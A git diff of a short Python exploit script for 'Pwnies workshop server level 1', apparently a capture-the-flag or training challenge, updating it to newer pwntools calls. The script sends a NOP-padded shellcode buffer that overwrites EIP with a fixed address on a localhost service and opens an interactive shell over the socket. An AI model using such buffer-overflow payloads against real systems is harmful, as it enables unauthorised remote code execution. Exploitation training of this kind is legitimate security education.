@@ -2,10 +2,7 @@
 
 # Pwnies workshop server level 1
 
-import sys, socket
-from pwn import *
-context('i386', 'linux', 'ipv4')
-from pwn.i386 import nops
+from pwn.classic import *
 
 sock = remote('localhost', 1337, timeout = 120)
 sock.recvuntil('Your output to my input? Do your best!\n')
@@ -15,6 +12,6 @@ sock.recvuntil('Your output to my input? Do your best!\n')
 # you are running through NAT
 shellcode = asm(findpeersh(sock.lport))
 
-eip = p32(0x0804a080)
-sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
+eip = 0x0804a080
+sock.send(flat(nop_pad(0xD4, findpeersh(sock.lport), avoid='\x00\r\n'), eip, '\n'))
 sock.interactive()
